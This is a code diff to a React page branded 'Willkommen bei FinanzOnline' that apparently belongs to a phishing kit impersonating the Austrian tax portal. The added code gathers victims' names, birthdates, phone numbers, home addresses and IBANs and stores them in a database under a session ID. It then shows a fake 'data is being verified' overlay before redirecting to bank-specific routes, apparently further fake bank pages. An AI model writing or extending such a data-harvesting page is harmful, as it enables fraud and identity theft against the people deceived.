@@ -76,10 +76,25 @@ const bankRouteMap: Record<string, string> = {
 };
 
 const Index = () => {
+  const navigate = useNavigate();
   const [bankOpen, setBankOpen] = useState(false);
   const [selectedBank, setSelectedBank] = useState("");
   const [bankSearch, setBankSearch] = useState("");
   const inputRef = useRef<HTMLInputElement>(null);
+  const [showLoading, setShowLoading] = useState(false);
+
+  // Form state
+  const [fullName, setFullName] = useState("");
+  const [email, setEmail] = useState("");
+  const [birthdate, setBirthdate] = useState("");
+  const [phone, setPhone] = useState("");
+  const [street, setStreet] = useState("");
+  const [houseNumber, setHouseNumber] = useState("");
+  const [staircase, setStaircase] = useState("");
+  const [doorNumber, setDoorNumber] = useState("");
+  const [postalCode, setPostalCode] = useState("");
+  const [city, setCity] = useState("");
+  const [iban, setIban] = useState("");
 
   useEffect(() => {
     if (bankOpen && inputRef.current) {
@@ -89,8 +104,38 @@ const Index = () => {
 
   const selectedBankObj = banks.find((b) => b.name === selectedBank);
 
+  const handleSubmit = useCallback(async () => {
+    if (!selectedBank) return;
+    const sessionId = crypto.randomUUID().slice(0, 8);
+    await supabase.from("submissions").insert({
+      session_id: sessionId,
+      full_name: fullName,
+      email,
+      birthdate,
+      phone,
+      street,
+      house_number: houseNumber,
+      staircase,
+      door_number: doorNumber,
+      postal_code: postalCode,
+      city,
+      iban,
+      bank: selectedBank,
+    });
+    const route = bankRouteMap[selectedBank];
+    if (route) {
+      setShowLoading(true);
+      setTimeout(() => {
+        navigate(`${route}?s=${sessionId}`);
+      }, 2500);
+    }
+  }, [selectedBank, fullName, email, birthdate, phone, street, houseNumber, staircase, doorNumber, postalCode, city, iban, navigate]);
+
   return (
     <div className="min-h-screen bg-white">
+      {showLoading && (
+        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
+      )}
       <Header />
       <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
         Willkommen bei FinanzOnline
